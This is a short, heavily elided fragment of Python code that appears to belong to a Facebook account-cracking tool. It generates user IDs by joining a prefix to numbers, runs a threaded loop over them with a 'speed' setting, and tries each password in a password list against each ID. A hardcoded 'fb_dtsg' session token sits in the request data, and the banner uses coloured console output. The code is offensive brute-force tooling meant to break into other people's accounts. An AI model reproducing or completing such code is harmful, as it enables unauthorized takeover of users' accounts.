...
def ___random_main___():
    ...
    with tred(max_workers=speed) as executor:
        ...
        print(f'    {W}[{Y}✓{W}] SPEED {W}:[{G} {speed} {W}] {G}update t {W}- {rad}8:40')
        linex()
        for love in user:
            ids = code + love
            if mtd == "1":
...
def _TEAM_RANDOM_M1(ids):
    ...
    try:
        for pw in plist:
            ...
            'fb_dtsg': 'NAfuhtsBT9O5k9SG_6G1qtb4PgOPMWKzL-TmpdcSgOuAeQrIs5w8EJA:0:0',
